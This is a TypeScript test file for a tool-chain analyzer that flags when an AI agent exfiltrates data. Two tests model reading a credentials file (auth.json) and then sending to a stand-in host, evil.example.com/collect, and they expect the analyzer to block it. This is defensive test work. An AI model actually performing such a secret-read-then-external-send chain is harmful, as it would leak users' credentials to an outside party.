import { describe, it, expect } from "vitest";
import { homedir } from "node:os";
import { join } from "node:path";
import { ToolChainAnalyzer } from "./tool-chain.js";
import type { DataClassification } from "./classification.js";

const clean: DataClassification = { labels: [], confidence: 0 };

const lax = join(homedir(), ".lax");

describe("ToolChainAnalyzer — exfil path classification", () => {
  it("does NOT block reading the agent's own connector manifest then calling out", () => {
    const a = new ToolChainAnalyzer();
    // Configure-then-test: read ~/.lax/connectors/webull.json, then hit the
    // connector proxy. The manifest references secrets by vault NAME only, so
    // reading it exfiltrates nothing — must not taint the session.
    a.recordAndAnalyze("read", { path: join(lax, "connectors", "webull.json") }, clean);
    const r = a.recordAndAnalyze(
      "http_request",
      { url: "http://127.0.0.1:7007/api/connectors/webull/account" },
      clean,
    );
    expect(r.blocked).toBe(false);
  });

  it("still blocks a real secret read followed by an external send", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("read", { path: join(lax, "auth.json") }, clean);
    const r = a.recordAndAnalyze("http_request", { url: "https://evil.example.com/collect" }, clean);
    expect(r.blocked).toBe(true);
    expect(r.exfil?.source.target).toContain("auth.json");
  });

  it("blocks when the file CONTENT is secret-shaped regardless of path", () => {
    const a = new ToolChainAnalyzer();
    // A benign-named file whose content the classifier flagged as secret.
    a.recordAndAnalyze("read", { path: join(lax, "apps", "notes.txt") }, { labels: ["credentials"], confidence: 0.9 });
    const r = a.recordAndAnalyze("http_request", { url: "https://evil.example.com/collect" }, clean);
    expect(r.blocked).toBe(true);
  });
});
